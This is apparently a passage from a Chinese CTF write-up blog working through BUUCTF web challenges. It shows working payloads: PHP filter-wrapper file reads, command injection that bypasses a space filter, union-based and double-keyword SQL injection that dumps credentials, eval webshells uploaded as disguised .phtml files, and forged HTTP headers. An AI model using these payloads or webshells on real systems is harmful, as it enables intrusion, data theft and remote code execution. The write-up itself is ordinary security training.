id="查阅结束"><a href="#查阅结束" class="headerlink" title="查阅结束"></a>查阅结束</h1><p>没看清么？回去再仔细看看吧。</p><p>Syclover @ cl4y</p></blockquote><p>啥也没有，——&gt;页面是直接跳转的</p><h2 id="bp抓包"><a href="#bp抓包" class="headerlink" title="bp抓包"></a>bp抓包</h2><p>返回头中：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--   secr3t.php        --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续查看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//flag放在了flag.php里</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="尝试传参："><a href="#尝试传参：" class="headerlink" title="尝试传参："></a>尝试传参：</h2><p><code>?file=flag.php</code></p><p>页面除了背景变黑没变化，F12中在style中背景改为白色，无</p><p>源码中过滤了一些关键字</p><h2 id="尝试使用filter过滤器"><a href="#尝试使用filter过滤器" class="headerlink" title="尝试使用filter过滤器"></a>尝试使用filter过滤器</h2><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行base64转码后得到flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping1"><a href="#GXYCTF2019-Ping-Ping-Ping1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping1"></a>[GXYCTF2019]Ping Ping Ping1</h2><p>环境描述：</p><blockquote><p>/?ip=</p></blockquote><p>ping一下本机：<code>ping 127.0.0.1</code></p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>继续：<code>ping 127.0.0.1;ls;</code></p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token operator">.</span>phpindex<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><code>ping 127.0.0.1;ls;cat flag.php</code></p><blockquote><p>/?ip= fxck your space!</p></blockquote><p>?????花里胡哨</p><p>经尝试，过滤了空格</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token constant">PING</span> <span class="token number">1</span> <span class="token punctuation">(</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token operator">.</span>phpindex<span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>过滤了flag</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h3><p><code>?ip=127.0.0.1;ls;a=g;b=fla;cat$IFS$b$a.php</code></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>ps: 参数顺序要注意，ba换位ab，flag会被检测出来：）</strong></p><p>参考：<a href="https://blog.csdn.net/qq_42812036/article/details/104297163?ops_request_misc=%7B%22request_id%22:%22165208109616782391838497%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165208109616782391838497&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-104297163-null-null.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BGXYCTF2019%5DPing+Ping+Ping+1&spm=1018.2226.3001.4187">ctf ping 命令执行</a></p><h1 id="8、-极客大挑战-2019-LoveSQL1"><a href="#8、-极客大挑战-2019-LoveSQL1" class="headerlink" title="8、[极客大挑战 2019]LoveSQL1"></a>8、[极客大挑战 2019]LoveSQL1</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote><p>这群该死的黑客，竟然这么快就找到了我的flag,这次我把它们放在了那个地方，哼哼！</p><p>用户名：</p><p>密  码：                            </p><p>Syclover @ cl4y</p></blockquote><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>1.判断注入点：<code>1&#39; or 1=1#</code> 得到回显：</p><blockquote><p>跳转到了check.php页面。并得到了用户名和密码：</p><h1 id="Login-Success"><a href="#Login-Success" class="headerlink" title="Login Success!"></a>Login Success!</h1><p>Hello admin！</p><p>Your password is ‘be53a02c355072e2ef4eaa93c02c9ffb’</p></blockquote><p>2.尝试密码<a href="https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020">md5</a>解密失败，还是回到注入的思路上，查询字段数：<br>在url中输入：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' order by 3%23&amp;password=1     存在/check.php?username=admin'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span>     报错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注意：此时是在url中输入的，所以不能用#，而用其url编码%23。</strong></p><p>3.用<code>union</code>查询测试注入点（回显点位）：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h1 id="Login-Success-1"><a href="#Login-Success-1" class="headerlink" title="Login Success!"></a>Login Success!</h1><p>Hello 2！</p><p>Your password is ‘3’</p></blockquote><p>4.得到回显点位为2和3，查询当前数据库名及版本：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello geek！</p><p>Your password is ‘10.3.18-MariaDB’</p></blockquote><p>5.爆表：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2！</p><p>Your password is ‘geekuser,l0ve1ysq1’</p></blockquote><p>6.猜测为：<code>l0ve1ysq1</code>这个表：<br>爆字段：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>l0ve1ysq1'<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2！</p><p>Your password is ‘id,username,password’</p></blockquote><p>7.爆数据：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Hello 2！</p><p>Your password is  ‘1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{d9614f96-0272-4d9d-a8e4-de936e0cd958}’</p></blockquote><p>得到flag：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">flag&#123;d9614f96<span class="token operator">-</span><span class="token number">0272</span><span class="token operator">-</span><span class="token number">4</span>d9d<span class="token operator">-</span>a8e4<span class="token operator">-</span>de936e0cd958&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="9、-极客大挑战-2019-Knife1"><a href="#9、-极客大挑战-2019-Knife1" class="headerlink" title="9、[极客大挑战 2019]Knife1"></a>9、[极客大挑战 2019]Knife1</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote><h1 id="我家菜刀丢了，你能帮我找一下么"><a href="#我家菜刀丢了，你能帮我找一下么" class="headerlink" title="我家菜刀丢了，你能帮我找一下么"></a>我家菜刀丢了，你能帮我找一下么</h1><p>eval($_POST[“Syc”]);</p></blockquote><p>诶，感觉这个我会哇，可是我没有菜刀哈哈，不知道我仅有的蚁剑有没有缘分见到flag</p><h2 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h2><p>bp抓包，post传入：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"Syc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>简简单单：在最前面的目录中—-&gt;flag</p><h1 id="10、-极客大挑战-2019-Http1"><a href="#10、-极客大挑战-2019-Http1" class="headerlink" title="10、[极客大挑战 2019]Http1"></a>10、[极客大挑战 2019]Http1</h1><h2 id="知识点概括："><a href="#知识点概括：" class="headerlink" title="知识点概括："></a>知识点概括：</h2><blockquote><ol><li>Referer：Referer是<a href="https://so.csdn.net/so/search?q=header&spm=1001.2101.3001.7020">header</a>的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。”</li><li>UA（User Agent）：“user agent是指用户代理,简称 UA。 作用:使服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。 （概括：一般访问浏览器的名字都会设置在UA）</li><li>X-Forwarded-For ： HTTP 扩展头部。是用来识别通过<a href="https://baike.baidu.com/item/HTTP">HTTP</a><a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86">代理</a>或<a href="https://baike.baidu.com/item/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">负载均衡</a>方式连接到<a href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8">Web服务器</a>的客户端最原始的<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80">IP地址</a>的HTTP请求头字段。</li></ol></blockquote><h2 id="环境描述："><a href="#环境描述：" class="headerlink" title="环境描述："></a>环境描述：</h2><blockquote><p>页面中没有发现什么有价值的东西，于是F12查看源码，发现：</p><p><code>href=&quot;Secret.php&quot;</code></p></blockquote><p>访问跳转页面：</p><blockquote><p>得到：</p><p><code>It doesn&#39;t come from &#39;https://Sycsecret.buuoj.cn&#39;</code></p><p>此时想到：题目描述是HTTP（请求头伪造？）</p></blockquote><h2 id="hacbar构造payload"><a href="#hacbar构造payload" class="headerlink" title="hacbar构造payload"></a>hacbar构造payload</h2><blockquote><ol><li>构造：Referer:<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></li><li>提示：<code>Please use &quot;Syclover&quot; browser</code></li><li>构造：<code>User Agent: Syclover</code></li><li>提示：No!!! you can only read this locally!!!</li><li>构造：<code>X-Forwarded-For: 127.0.0.1</code></li><li>得到flag：<code>flag&#123;54d0092a-e344-464a-b1b8-7a179015c8f6&#125;</code></li></ol></blockquote><h2 id="BP抓包修改HTTP请求头"><a href="#BP抓包修改HTTP请求头" class="headerlink" title="BP抓包修改HTTP请求头"></a>BP抓包修改HTTP请求头</h2><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Secret.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">node4.buuoj.cn:26365</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Syclover</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://Sycsecret.buuoj.cn</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：构造的请求头中，每一个参数后需要空格</p></blockquote><h1 id="11、-极客大挑战-2019-Upload1"><a href="#11、-极客大挑战-2019-Upload1" class="headerlink" title="11、[极客大挑战 2019]Upload1"></a>11、[极客大挑战 2019]Upload1</h1><h2 id="环境描述：-1"><a href="#环境描述：-1" class="headerlink" title="环境描述："></a>环境描述：</h2><blockquote><p>文件上传框，提示类型为图片</p><hr></blockquote><blockquote><p>随便提交一个：</p><p>返回：NOT image！</p></blockquote><h2 id="BP抓包"><a href="#BP抓包" class="headerlink" title="BP抓包"></a>BP抓包</h2><blockquote><p>将Content-Type里面的格式改为==image/jpeg==</p><p>post传参，写入一句话木马：</p><p><code>&lt;?php **eval**(@$_POST[&#39;1&#39;]);?&gt;</code></p><p>返回：<strong>NOT！php!</strong></p></blockquote><h2 id="过滤后缀"><a href="#过滤后缀" class="headerlink" title="过滤后缀"></a>过滤后缀</h2><blockquote><p>常见绕过后缀的有文件格式有：php,php3,php4,php5,phtml.pht</p></blockquote><blockquote><p>这里phtml可以绕过，但是返回：<br>`NO! HACKER! your file included ‘&lt;?’</p></blockquote><h2 id="换一句木马"><a href="#换一句木马" class="headerlink" title="换一句木马"></a>换一句木马</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功绕过</p><h2 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h2><blockquote><p>猜测路径为  </p><p><code>http://432fcfb5-9ceb-4e54-9cb2-1eeabd3b10a6.node4.buuoj.cn:81/upload/aWord1.phtml</code></p></blockquote><p>密码：</p><blockquote><p><code>shell</code></p></blockquote><p>根目录下得到flag文件</p><h1 id="12、-ACTF2020-新生赛-Upload1"><a href="#12、-ACTF2020-新生赛-Upload1" class="headerlink" title="12、[ACTF2020 新生赛]Upload1"></a>12、[ACTF2020 新生赛]Upload1</h1><h2 id="环境描述"><a href="#环境描述" class="headerlink" title="环境描述"></a>环境描述</h2><blockquote><p>文件上传</p></blockquote><p>要求格式为：</p><p>考虑：上传一句话木马后发现他有一个白名单，只能上传以这个结尾的文件，那么我们将后缀修改为png上传，再用bp<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>再改为phtml就好</p><p>和上一题思路大致</p><h2 id="BP抓包修改"><a href="#BP抓包修改" class="headerlink" title="BP抓包修改"></a>BP抓包修改</h2><blockquote><p>`Content-Type: image/png</p><?php eval(@$_POST['1']);?><p>`</p></blockquote><p>返回：</p><blockquote><p><code>Upload Success! Look here~ ./uplo4d/11b327e23e72bfb7bf0cc8c9d098384d.phtml</code></p></blockquote><p>构造蚁剑链接</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//d2dbf14f-ace8-4c2a-a53d-55ffd313eb12.node4.buuoj.cn:81/uplo4d/11b327e23e72bfb7bf0cc8c9d098384d.phtml</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><ol><li>这一题好像在前端就进行了文件格式过滤，猜测在js中进行判断，尝试寻找js—–&gt;失败</li><li>只能BP抓包修改后缀类型了</li></ol></blockquote><h1 id="13、-极客大挑战-2019-BabySQL"><a href="#13、-极客大挑战-2019-BabySQL" class="headerlink" title="13、[极客大挑战 2019]BabySQL"></a>13、[极客大挑战 2019]BabySQL</h1><h2 id="环境描述-1"><a href="#环境描述-1" class="headerlink" title="环境描述"></a>环境描述</h2><blockquote><p>username、passwd框</p></blockquote><p><code>应该为注入点</code></p><p>1&gt;</p><pre class="line-numbers language-none"><code class="language-none">?username&#x3D;11&#39;&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回：</p><blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MariaDB server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'22'</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>2&gt;</p><p>order by 判断列数<code>11&#39; order by 4#</code></p><p>发现order by 被过滤</p><p>返回</p><blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'der 4#'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'22'</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>union、or\where\select也被过滤</p></blockquote><p>3&gt;判断回显位</p><p>新芝士：关键字双写绕过（猜测只过滤一次）</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span><span class="token number">15</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>返回</p><pre class="line-numbers language-sql'" data-language="sql'"><code class="language-sql'">Hello 3！Your password is &#39;4&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p>4&gt;查数据库</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">11</span>' ununionion seselectlect <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回</p><blockquote><p>`Hello 2！</p><p>Your password is ‘geek’`</p></blockquote><p>5&gt;查表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">11</span><span class="token string">' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='</span>geek'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token 